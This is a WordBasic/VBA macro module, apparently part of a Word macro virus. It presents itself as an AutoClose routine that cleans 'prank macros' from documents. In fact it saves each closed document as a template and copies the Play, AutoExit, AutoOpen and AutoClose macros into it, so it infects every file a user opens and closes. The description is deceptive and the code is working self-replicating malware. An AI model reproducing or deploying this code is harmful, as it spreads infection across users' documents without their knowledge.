   Attribute VB_Name = "VClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VClose.MAIN"
   Dim vZap$
   Dim vMacro$
       On Error GoTo -1: On Error GoTo Abort

           WordBasic.FileSaveAs Format:=1

           vZap$ = WordBasic.[FileName$]()

           vMacro$ = vZap$ + ":Play"
           WordBasic.MacroCopy "Global:Play", vMacro$

           vMacro$ = vZap$ + ":AutoExit"
           WordBasic.MacroCopy "Global:AutoExit", vMacro$

           vMacro$ = vZap$ + ":AutoOpen"
           WordBasic.MacroCopy "Global:VOpen", vMacro$

           vMacro$ = vZap$ + ":VClose"
           WordBasic.MacroCopy "Global:AutoClose", vMacro$

           WordBasic.FileSaveAs Format:=1

   Abort:
   End Sub
